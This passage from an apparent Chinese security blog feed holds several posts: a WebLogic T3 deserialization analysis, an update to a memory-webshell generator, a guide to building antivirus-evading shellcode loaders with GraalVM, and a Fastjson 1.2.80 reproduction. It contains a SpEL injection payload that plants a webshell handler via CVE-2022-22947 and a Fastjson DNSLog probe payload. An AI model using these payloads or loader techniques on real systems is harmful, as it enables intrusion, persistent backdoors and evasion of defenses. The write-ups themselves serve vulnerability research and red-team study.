17:18 pwned</span><br></pre></td></tr></table></figure><h2 id="逆向T3协议头"><a href="#逆向T3协议头" class="headerlink" title="逆向T3协议头"></a>逆向T3协议头</h2><p><img src="/img/weblogica_e.png"></p><p>猜测关键词暴力搜索后，找到第一次交互时响应数据的来源。下断点得到调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">connectReplyOK:<span class="number">160</span>, Login (weblogic.socket)</span><br><span class="line">readBootstrapMessage:<span class="number">189</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">323</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">dispatch:<span class="number">185</span>, MuxableSocketDiscriminator (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure><p><img src="/img/weblogica_f.png"></p><p><code>MuxableSocketT3#dispatch</code>方法根据<code>bootstrapped</code>来判断连接是否经<code>readBootstrapMessage</code>方法初始化过，解析提取的就是上文首次通信时发给服务端的数据。（这是10.3.6.0的位置，12.2.1.3在<code>com.oracle.weblogic.rjvm.jar</code>中<code>weblogic/rjvm/t3/MuxableSocketT3#readIncomingConnectionBootstrapMessage</code>）</p><p><img src="/img/weblogica_g.png"></p><p><code>MuxableSocketDiscriminator#dispatch</code>方法根据协议名将请求分配给HTTP、T3等不同处理类，以此实现端口复用。</p><p><img src="/img/weblogica_h.png"></p><p>再将断点下在<code>ObjectInputStream#readObject</code>并得到第二次请求时的调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">readObject0:<span class="number">1327</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">349</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">67</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">39</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure><p><img src="/img/weblogica_i.png"></p><p>数据由<code>MsgAbbrevInputStream#init</code>调用各个方法解析。先看<code>super.init(chunk, 4)</code>，最终前4字节被skip掉：</p><p><img src="/img/weblogica_j.png"></p><p>这4个字节其实就是EXP中的<code>chunkLength</code>，表示包括自己在内的这段<code>Header</code>的字节长度，可以偷懒直接赋0。</p><p>继续看到<code>readHeader</code>方法中存在大量标识数据：</p><p><img src="/img/weblogica_k.png"></p><p><code>cmd</code>字节应该是指代通信类型，可以从<code>weblogic/rjvm/JVMMessage</code>类中的变量名看出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_UNDEFINED = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_IDENTIFY_REQUEST = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_IDENTIFY_RESPONSE = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_REQUEST_CLOSE = <span class="number">11</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_IDENTIFY_REQUEST_CSHARP = <span class="number">12</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_IDENTIFY_RESPONSE_CSHARP = <span class="number">13</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_NO_ROUTE_IDENTIFY_REQUEST = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_TRANSLATED_IDENTIFY_RESPONSE = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_PEER_GONE = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_ONE_WAY = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_REQUEST = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_RESPONSE = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_ERROR_RESPONSE = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> CMD_INTERNAL = <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p><code>QOS</code>字节没猜到含义，类初始化时被赋为十进制<code>101</code>，所以EXP同样用了这个值。</p><p><code>flags</code>字节从后面<code>getFlag</code>方法可以看出用来从二进制位控制<code>hasJVMIDs</code>、<code>hasTX</code>、<code>hasTrace</code>（类比Linux的rwx权限与777）</p><p><code>responseId</code>字节用于标识通信顺序、<code>invokeableId</code>字节用于标识被调用的方法，目前用不到置为初始值-1。</p><p><code>abbrevOffset</code>字节顾名思义是abbrev的偏移长度，表示<code>Header</code>结尾处 相距 后面字节流<code>MsgAbbrevs</code>部分的距离，在<code>init</code>方法中会被skip掉，EXP中直接赋0表示没有额外的数据需要跳过。</p><p>读完<code>Header</code>部分继续进入到<code>readMsgAbbrevs</code>方法中，会调用<code>InboundMsgAbbrev#read</code>方法：</p><p><img src="/img/weblogica_l.png"></p><p><code>length</code>就是EXP中的<code>countLength</code>，可以看到这个值对应for循环的次数。</p><p><code>length2</code>就是EXP中的<code>capacityLength</code>，<code>bubblingAbbrever.getCapacity()</code>拿到的就是第一次请求中的<code>AS</code>，要设置得比它大才会进入<code>readObeject</code>分支。</p><p>最后进入重写的有参<code>readObject</code>中，<code>msgAbbrevInputStream.read()</code>读到的字节是十进制0时进入无参<code>readObject</code>。但<code>ServerChannelInputStream</code>没有重写无参<code>readObject</code>，所以最终进到父类<code>ObjectInputStream</code>的<code>readObject</code>衔接上CC链。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><p><a href="http://frohoff.github.io/appseccali-marshalling-pickles/">http://frohoff.github.io/appseccali-marshalling-pickles/</a></p></li><li><p><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#weblogic">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#weblogic</a></p></li><li><p><a href="https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</a></p></li><li><p><a href="https://updates.oracle.com/Orion/AdvancedSearch/process_form">https://updates.oracle.com/Orion/AdvancedSearch/process_form</a></p></li><li><p><a href="https://www.oracle.com/security-alerts/public-vuln-to-advisory-mapping.html">https://www.oracle.com/security-alerts/public-vuln-to-advisory-mapping.html</a></p></li><li><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p></li><li><p><a href="https://hosch3n.github.io/2022/02/15/%E6%94%BB%E5%87%BBJavaRMI%E6%A6%82%E8%BF%B0/#%E6%94%BB%E5%87%BBJRMP%E5%AE%A2%E6%88%B7%E7%AB%AF">https://hosch3n.github.io/2022/02/15/%E6%94%BB%E5%87%BBJavaRMI%E6%A6%82%E8%BF%B0/#%E6%94%BB%E5%87%BBJRMP%E5%AE%A2%E6%88%B7%E7%AB%AF</a></p></li><li><p><a href="https://docs.oracle.com/middleware/12213/wls/WLRMI/rmi_intro.htm#WLRMI109">https://docs.oracle.com/middleware/12213/wls/WLRMI/rmi_intro.htm#WLRMI109</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;@frohoff在2015年初发现&lt;code&gt;commons-collections&lt;/code&gt;的反序列化利用链并发布&lt;code&gt;ysoserial&lt;/code&gt;工具9个月后[1]，@breenmachine对众多知名Java中间件的利用文章[2]使Java反序列化漏洞变</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Weblogic" scheme="https://hosch3n.github.io/tags/Weblogic/"/>
    
    <category term="CVE-2015-4852" scheme="https://hosch3n.github.io/tags/CVE-2015-4852/"/>
    
  </entry>
  
  <entry>
    <title>Msmap内存马生成框架（三）</title>
    <link href="https://hosch3n.github.io/2022/10/29/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2022/10/29/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2022-10-29T04:43:40.000Z</published>
    <updated>2022-10-29T06:22:19.763Z</updated>
    
    <content type="html"><![CDATA[<p>上一次水文还在遥远的上一次，期间除了进一步解藕和美化外：</p><ol><li><p>添加了Tomcat7、Resin4、SpringMVC、SpringCloud、JVM的内存马</p></li><li><p>优化类加载方式、StandardContext获取方式</p></li><li><p>增加兼容蚁剑和冰蝎的XOR编码器，对JSP/X脚本Unicode编码</p></li><li><p>支持复制类字节码到系统剪切板，捞起了WsFilter的自动编译</p></li></ol><hr><p>先说最没有营养的，安装<code>pyperclip</code>模块就能在生成和自动编译后，将Base64编码的类字节码复制到系统剪切板，省去了在终端里手动复制的过程。这是我感觉最舒服的一个功能，主要是因为容易写不费脑子= =</p><p>对于Spring Cloud Gateway的SpEL注入（CVE-2022-22947），可以使用如下示例语句注入<code>Spring Handler</code>，将<code>BASE64_CLASSBYTES</code>替换为生成的类字节码，<code>/index</code>对应内存马的绑定路径。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;SpringHandler&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;BASE64_CLASSBYTES&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).addHandler(@requestMappingHandlerMapping, &#x27;/index&#x27;)&#125;</span><br></pre></td></tr></table></figure><p>AgentFiless（JVM）内存马是偷了冰蝎的AgentNoFile移植过来的，《论如何优雅的注入Java Agent内存马》不说概念完全不懂，具体技术细节那也是一脸懵逼。目前只是实验性地做了半自动适配，也许ASM全自动就在不久的下一次？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上一次水文还在遥远的上一次，期间除了进一步解藕和美化外：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;添加了Tomcat7、Resin4、SpringMVC、SpringCloud、JVM的内存马&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;优化类加载方式、StandardContext获取方式</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="WebShell" scheme="https://hosch3n.github.io/tags/WebShell/"/>
    
    <category term="MBean" scheme="https://hosch3n.github.io/tags/MBean/"/>
    
    <category term="ClassLoader" scheme="https://hosch3n.github.io/tags/ClassLoader/"/>
    
    <category term="Instrument" scheme="https://hosch3n.github.io/tags/Instrument/"/>
    
  </entry>
  
  <entry>
    <title>利用GraalVM实现免杀加载器</title>
    <link href="https://hosch3n.github.io/2022/09/16/%E5%88%A9%E7%94%A8GraalVM%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <id>https://hosch3n.github.io/2022/09/16/%E5%88%A9%E7%94%A8GraalVM%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80%E5%8A%A0%E8%BD%BD%E5%99%A8/</id>
    <published>2022-09-16T02:00:12.000Z</published>
    <updated>2023-04-19T07:54:34.931Z</updated>
    
    <content type="html"><![CDATA[<p>起因是与NoOne想围观一下CS47又整了些什么反破解操作，发现<code>TeamServerImage</code>套了个GraalVM。贴一段官网的介绍以及如何看待乎的链接：</p><blockquote><p>Get started with GraalVM – is a high-performance JDK designed to accelerate Java application performance while consuming fewer resources. GraalVM offers two ways to run Java applications: on the HotSpot JVM with Graal just-in-time (JIT) compiler or as an ahead-of-time (AOT) compiled native executable. Besides Java, it provides runtimes for JavaScript, Ruby, Python, and a number of other popular languages. GraalVM’s polyglot capabilities make it possible to mix programming languages in a single application while eliminating any foreign language call costs.</p></blockquote><p><a href="https://www.zhihu.com/question/274042223">如何评价 GraalVM 这个项目？</a></p><p>性能优化就不说了，关键它支持多种主流语言的JIT和Java的AOT，也就是可以编译成不依赖外部JRE的PE/ELF，大家有没有想起些什么～</p><p><a href="https://mp.weixin.qq.com/s/brSzTx-U62iTF9EjEtVLSg">精简JRE,打造无依赖的Java-ShellCode-Loader</a></p><p>Mr6师傅通过将精简JRE与JavaShellCodeLoader打包的方式，实现了免杀良好的加载器。GraalVM则是将class编译为了机器码，一般不用再单独打包且性能更好（Elegant, Very elegant</p><h2 id="如何整活"><a href="#如何整活" class="headerlink" title="如何整活"></a>如何整活</h2><ol><li><p>跟着<a href="https://www.graalvm.org/22.2/docs/getting-started/#install-graalvm">官方文档</a>安装好CE版本<code>core</code>和<code>native-image</code>，也可以从Oracle下<a href="https://www.oracle.com/downloads/graalvm-downloads.html">EE版本</a></p></li><li><p>准备好需要的<a href="https://www.graalvm.org/22.2/reference-manual/native-image/#prerequisites">编译环境</a></p></li><li><p>正常编写java并编译为class</p></li><li><p>通过<code>native-image YourClass</code>编译为PE/ELF</p></li></ol><p>注意上文说了<strong>一般</strong>，写个Runtime执行命令自然没有问题，但如果用到了反射等动态特性，就得引入它的agent执行class让它分析一下，生成几个后面<code>native-image</code>会用到的配置文件：</p><p><a href="https://medium.com/graalvm/introducing-the-tracing-agent-simplifying-graalvm-native-image-configuration-c3b56c486271">Introducing the Tracing Agent: Simplifying GraalVM Native Image Configuration</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p META-INF/native-image</span><br><span class="line"><span class="variable">$JAVA_HOME</span>/bin/java -agentlib:native-image-agent=config-output-dir=META-INF/native-image HelloReflection foo xyz</span><br></pre></td></tr></table></figure><p>不过。。。反正我抄出来的JavaShellCodeLoader这样子干它是分析不出的。。。</p><p>在没提供额外配置且用到了反射时，<code>native-image</code>会编译为<code>fallback image</code>，需要把class文件和PE/ELF放一起才可以正常执行。虽然可以用enigmavb打包解决，<del>还是希望会的师傅指点一下我怎么原生编译出来Orz</del></p><p>另一个问题是在Linux编译时默认会依赖libc，出于兼容考虑应该可以在很老的系统上编译，或者跟着<a href="https://www.graalvm.org/22.2/reference-manual/native-image/guides/build-static-executables/">文档</a>准备好环境，通过<code>--static --libc=musl</code>参数静态打包。</p><p>我因为一些库本来就有或是通过<code>pamac</code>装上了，没完全按步骤走然后报错了，似乎是把<code>-lz</code>参数当成文件：</p><p><img src="/img/graalvm_a.png"></p><p>更新：</p><p>Linux升级ld后似乎没问题了，Windows上需要加入VS和SDK的环境变量。找不到<code>tools.jar</code>里的类时需要<code>-cp</code>指定JAR包。动态类加载参考<a href="https://github.com/oracle/graal/pull/2442">这个PR</a>。</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Windows</span> <span class="title">Kits</span>\10\<span class="title">Include</span>\10.0.17134.0\<span class="title">um</span>;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Windows</span> <span class="title">Kits</span>\10\<span class="title">Include</span>\10.0.17134.0\<span class="title">ucrt</span>;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Windows</span> <span class="title">Kits</span>\10\<span class="title">Include</span>\10.0.17134.0\<span class="title">shared</span>;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">Studio</span>\2019\<span class="title">Community</span>\<span class="title">VC</span>\<span class="title">Tools</span>\<span class="title">MSVC</span>\14.16.27023\<span class="title">include</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Windows</span> <span class="title">Kits</span>\10\<span class="title">Lib</span>\10.0.17134.0\<span class="title">um</span>\<span class="title">x64</span>;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Windows</span> <span class="title">Kits</span>\10\<span class="title">Lib</span>\10.0.17134.0\<span class="title">ucrt</span>\<span class="title">x64</span>;</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">Studio</span>\2019\<span class="title">Community</span>\<span class="title">VC</span>\<span class="title">Tools</span>\<span class="title">MSVC</span>\14.16.27023\<span class="title">lib</span>\<span class="title">x64</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">Studio</span>\2019\<span class="title">Community</span>\<span class="title">VC</span>\<span class="title">Tools</span>\<span class="title">MSVC</span>\14.16.27023\<span class="title">bin</span>\<span class="title">HostX64</span>\<span class="title">x64</span></span></span><br></pre></td></tr></table></figure><h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>VT几乎全过，相信我那一个红的是误报（2333</p><p><img src="/img/graalvm_b.png"></p><p>原生shellcode就能过defender，不过瞎捣鼓还是有几率被杀～</p><p><img src="/img/graalvm_c.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;起因是与NoOne想围观一下CS47又整了些什么反破解操作，发现&lt;code&gt;TeamServerImage&lt;/code&gt;套了个GraalVM。贴一段官网的介绍以及如何看待乎的链接：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Get started with GraalVM –</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="GraalVM" scheme="https://hosch3n.github.io/tags/GraalVM/"/>
    
    <category term="attach" scheme="https://hosch3n.github.io/tags/attach/"/>
    
    <category term="loader" scheme="https://hosch3n.github.io/tags/loader/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson1.2.80漏洞复现</title>
    <link href="https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-09-01T05:10:28.000Z</published>
    <updated>2022-09-02T10:57:43.834Z</updated>
    
    <content type="html"><![CDATA[<p>Fastjson于5月23日，在<a href="https://github.com/alibaba/fastjson/commit/560782c9ee12120304284ba98b61dc61e30324b3">commit 560782c</a>与<a href="https://github.com/alibaba/fastjson/commit/097bff1a792e39f4e0b2807faa53af0e89fbe5e0">commit 097bff1</a>中更新了<a href="https://github.com/alibaba/fastjson/wiki/security_update_20220523">security_update_20220523</a>的修复方案。调整黑白名单的同时额外判断了<code>Exception</code>，并在添加类缓存mappings前新增了<code>autoTypeSupport</code>的判断。</p><p>显而易见<code>Exception</code>的派生类中出了叛徒，不久后<a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blacklist</a>更新了黑名单类名，直到前几天漏洞作者<a href="https://github.com/iSafeBlue">iSafeBlue</a>公开了思路与Gadgets，本文是对浅蓝师傅议题中留下的一点小作业的复现记录。</p><h2 id="期望类与类缓存"><a href="#期望类与类缓存" class="headerlink" title="期望类与类缓存"></a>期望类与类缓存</h2><p>不太了解的同学可以参考上一篇《Fastjson-autoType漏洞总结》，1.2.80第一步依然是基于众所周知的期望类机制将其它类加入类缓存，关键在于怎么横向出<code>Exception</code>之外的其它类型。</p><p>Fastjson反序列化恢复类实例时，自然也需要恢复用到了的类属性。如果这个属性是可利用的类且我们可控，是不是就能直接利用 或者进一步横向扩展出其它类间接利用。上一篇我们说到了期望类不但可以由JSON显式指定，同样可以由类间关系隐式确定，那么依靠属性名赋值时的隐式类间关系，也就不再需要在JSON中显式指定<code>@type</code>，从而绕过了<code>autoType</code>的白名单检查。</p><p>实例化类属性的对应类后，<strong>fast</strong>json会将其加入到类缓存mappings中，从缓存中取类在修复前不会判断<code>autoTypeSupport</code>，所以绕过了类白名单机制扩展出更多的可用类。</p><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><ol><li><p>指定显式期望类，实例化<code>XXXException</code>并被加入类缓存</p></li><li><p>通过<code>XXXException</code>中可控的属性名/参数名，由隐式类间关系实例化并被加入类缓存</p></li><li><p>直接从缓存中拿出来用，或者进一步递归让其它类被加入到缓存</p></li></ol><p>第二步的重点在于，既然不能显示指定期望类，就只能依靠<code>deserializer</code>去自动处理，我们需要构造出让它解析时进到特定<code>deserializer</code>分支的特定格式。对此我提供一个<code>aspectj</code>读文件和<code>groovy</code>远程类加载的具体实现便于师傅们理解复现。更多Gadgets浅蓝师傅在Slides中写得很清楚了，可以自行构造。</p><p><a href="https://github.com/hosch3n/FastjsonVulns">https://github.com/hosch3n/FastjsonVulns</a></p><p><img src="/img/fastjson1280_a.png"></p><p><img src="/img/fastjson1280_b.png"></p><h2 id="两点小坑"><a href="#两点小坑" class="headerlink" title="两点小坑"></a>两点小坑</h2><p>再提醒两点小坑，<del>一是如果DNSLog是用p师傅的CoNote，存在下划线时是不会被记录到的（这个问题让我自闭了一阵</del></p><p>经继续测试和p师傅提醒，如果链路上的DNS服务器缓存或不接受特殊字符，可能导致DNSLog记录丢失</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;val&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:&#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;</span><br><span class="line">                &quot;@type&quot;:&quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;:&quot;java.util.Locale&quot;,</span><br><span class="line">                &quot;country&quot;:&quot;g.token.dnslog.pw&quot;,</span><br><span class="line">                &quot;language&quot;:&#123;</span><br><span class="line">                    &quot;@type&quot;:&quot;java.lang.String&quot;&#123;</span><br><span class="line">                    &quot;x&quot;:&#123;</span><br><span class="line">                        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">                        &quot;val&quot;:&quot;org.python.antlr.ParseException&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>二是目前测试来看只有MacOS可以ping带花括号的域名，Linux和Windows会报错。所以这个探测链的Poc需要要合适的报错环境才能看到结果。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Fastjson于5月23日，在&lt;a href=&quot;https://github.com/alibaba/fastjson/commit/560782c9ee12120304284ba98b61dc61e30324b3&quot;&gt;commit 560782c&lt;/a&gt;与&lt;a href=</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Fastjson" scheme="https://hosch3n.github.io/tags/Fastjson/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="CVE-2022-25845" scheme="https://hosch3n.github.io/tags/CVE-2022-25845/"/>
    
  </entry>
  
  <entry>
    <title>Msmap内存马生成框架（二）</title>
    <link href="https://hosch3n.github.io/2022/08/09/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2022/08/09/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2022-08-09T03:34:37.000Z</published>
    <updated>2022-08-11T06:31:44.894Z</updated>
    
